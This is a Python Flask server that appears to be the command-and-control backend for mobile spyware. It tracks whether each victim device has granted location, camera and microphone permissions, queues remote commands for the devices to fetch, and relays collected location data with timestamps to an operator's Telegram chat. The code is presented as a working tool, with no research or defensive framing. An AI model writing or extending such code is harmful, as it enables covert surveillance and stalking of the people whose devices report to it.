from flask import Flask, request, jsonify
import threading
import requests

app = Flask(__name__)

# Store user data and commands
users = {}
telegram_bot_token = "YOUR_TELEGRAM_BOT_TOKEN"
admin_chat_id = "YOUR_CHAT_ID"

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage"
    payload = {
        "chat_id": admin_chat_id,
        "text": message
    }
    requests.post(url, json=payload)

@app.route('/update_permissions', methods=['POST'])
def update_permissions():
    data = request.json
    user_id = data['user_id']
    permissions = data['permissions']
    
    if user_id not in users:
        users[user_id] = {'permissions': permissions, 'commands': []}
    else:
        users[user_id]['permissions'] = permissions
    
    send_telegram_message(f"User {user_id} updated permissions:\n"
                         f"Location: {permissions['location']}\n"
                         f"Camera: {permissions['camera']}\n"
                         f"Microphone: {permissions['microphone']}")
    
    return jsonify({"status": "success"})

@app.route('/get_commands', methods=['GET'])
def get_commands():
    user_id = request.args.get('user_id')
    if user_id in users and users[user_id]['commands']:
        command = users[user_id]['commands'].pop(0)
        return jsonify({"command": command})
    return jsonify({"command": None})

@app.route('/receive_data', methods=['POST'])
def receive_data():
    data = request.json
    user_id = data['user_id']
    data_type = data['type']
    content = data['data']
    
    message = f"Data from {user_id}:\nType: {data_type}\n"
    
    if data_type == "location":
        message += f"Latitude: {content['lat']}\nLongitude: {content['lng']}\n"
        message += f"Timestamp: {content['timestamp']}"
    
    send_telegram_message(message)
    return jsonify({"status": "received"})

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    user_id = data['user_id']
    command = data['command']
    
    if user_id not in users:
        users[user_id] = {'permissions': {}, 'commands': []}
    
    users[user_id]['commands'].append(command)
    return jsonify({"status": "command queued"})

def run_bot_listener():
    # This would be a separate thread that listens for Telegram bot commands
    # and forwards them to the appropriate user
    pass

if __name__ == '__main__':
    bot_thread = threading.Thread(target=run_bot_listener)
    bot_thread.start()
    app.run(host='0.0.0.0', port=5000, threaded=True)
